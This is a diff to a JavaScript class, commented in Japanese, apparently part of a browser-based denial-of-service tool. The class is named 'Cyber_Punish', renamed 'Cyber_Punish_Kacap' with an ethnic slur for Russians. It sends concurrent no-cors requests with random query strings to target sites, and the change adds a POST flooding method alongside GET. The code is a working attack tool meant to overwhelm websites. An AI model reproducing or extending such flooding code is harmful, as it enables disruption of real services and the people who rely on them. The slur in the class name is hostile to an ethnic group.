@@ -1,12 +1,13 @@
 // クラス名
-class Cyber_Punish {
+class Cyber_Punish_Kacap {
 
     // コンストラクタ
     constructor(limit) {
       // 1秒ごとの送信頻度を設定
       this.CONCURRENCY_LIMIT = limit;
       // 非同期関数を定義
-      this.fetchWithTimeout = this.fetchWithTimeout.bind(this);   // リクエスト送信。
+      this.fetchWithTimeoutGet = this.fetchWithTimeoutGet.bind(this);   // リクエスト送信。
+      this.fetchWithTimeoutPost = this.fetchWithTimeoutPost.bind(this);   // リクエスト送信。
       this.punish_target = this.punish_target.bind(this);         // 各サイトにデータリクエストを送る。
     }
   
@@ -21,7 +22,7 @@ class Cyber_Punish {
     queue = [];
   
     // リクエスト送信
-    async fetchWithTimeout(resource, options) {
+    async fetchWithTimeoutGet(resource, options) {
       // コントローラーを取得
       const controller = new AbortController();
       // IDを取得
@@ -29,6 +30,27 @@ class Cyber_Punish {
       // リクエスト処理を返す。
       return fetch(resource, {
         method: 'GET',              // GET方式
+        mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
+        signal: controller.signal   // オブジェクトのインスタンスを返
+      }).then((response) => {       // 成功した場合
+        clearTimeout(id);			  // タイムアウトを消す。
+        return response;			  // 応答結果を返す。
+      }).catch((error) => {		  // 失敗した場合
+        console.log(error.code);    // エラーコードを出力
+        clearTimeout(id);			  // タイムアウトを消す。
+        throw error;				  // エラーを投げる。
+      });
+    }
+
+    // リクエスト送信
+    async fetchWithTimeoutPost(resource, options) {
+      // コントローラーを取得
+      const controller = new AbortController();
+      // IDを取得
+      const id = setTimeout(() => controller.abort(), options.timeout);
+      // リクエスト処理を返す。
+      return fetch(resource, {
+        method: 'POST',              // GET方式
         mode: 'no-cors',            // CORS-safelisted methodsとCORS-safelisted request-headersだけを使ったリクエストを送る。
         signal: controller.signal   // オブジェクトのインスタンスを返
       }).then((response) => {       // 成功した場合
@@ -55,7 +77,7 @@ class Cyber_Punish {
         // 送信リクエストを追加する。
         this.queue.push(
           // 関数を実行する(時間制限：1秒)
-          this.fetchWithTimeout(target+rand, { timeout: 1000 })
+          this.fetchWithTimeoutGet(target+rand, { timeout: 1000 })
             // エラーがある場合はエラーを取得する。
             .catch((error) => {
               if (error.code === 20 /* ABORT */) {
